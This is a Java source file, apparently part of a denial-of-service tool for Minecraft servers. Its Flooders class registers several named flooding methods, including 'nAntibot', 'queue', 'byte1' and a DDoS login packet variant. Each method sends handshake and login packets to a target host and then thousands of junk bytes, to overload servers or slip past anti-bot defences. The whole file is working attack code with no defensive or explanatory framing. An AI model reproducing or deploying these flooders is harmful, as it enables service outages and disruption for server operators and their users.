package asmr.dev_.dbv2;

import asmr.dev_.dbv2.options.PacketUtils;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class Flooders {
    public Flooders() {
        this.asmr_exploits = new HashMap<>();
        this.asmr_exploits.put("join", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, port, 47), out);
            PacketUtils.writePacket(PacketUtils.createLoginPacket(), out);
        });
        this.asmr_exploits.put("utf16_join", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, port, 47), out);
            PacketUtils.writePacket(PacketUtils.createDDOSLoginPacket(), out);
        });
        this.asmr_exploits.put("abd", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, + port, 47), out);
            for (int var9 = 0; var9 < 260; var9++) {
                out.write(3);
                out.write(0);
                out.write(1);
                out.write(49);
            }
        });
        this.asmr_exploits.put("nAntibot", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, port, 47), out);
            PacketUtils.writePacket(PacketUtils.createLoginPacket(), out);
            for (int i1 = 0; i1 < 1900; i1++) {
                out.write(1);
                out.write(0);
            }
        });
        this.asmr_exploits.put("queue", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, + port, 47), out);
            PacketUtils.writePacket(PacketUtils.createLoginPacket(), out);
            for (int i1 = 0; i1 < 1900; i1++) {
                out.write(1);
                out.write(0);
            }
        });
        this.asmr_exploits.put("byte1", (out, host, port) -> {
            out.write(-71);
            for (int i = 0; i < 1900; i++) {
                out.write(1);
                out.write(0);
            }
        });
        this.asmr_exploits.put("byte2", (out, host, port) -> {
            PacketUtils.writePacket(PacketUtils.createHandshakePacket(host, port, 47), out);
            PacketUtils.writePacket(PacketUtils.createLoginPacketSpam(), out);
            for (int i = 0; i < 1900; i++) {
                out.write(2);
                out.write(0);
                out.write(0);
            }
        });
    }
    private final Map<String, Flooder> asmr_exploits;

    public Flooder findById(String exp) {
        return this.asmr_exploits.get(exp);
    }

    public interface Flooder {
        void flood(DataOutputStream param1DataOutputStream, String param1String, int param1Int) throws IOException;
    }
    public Set<String> getAsmr_exploits() {
        return new HashSet<>(this.asmr_exploits.keySet());
    }
}
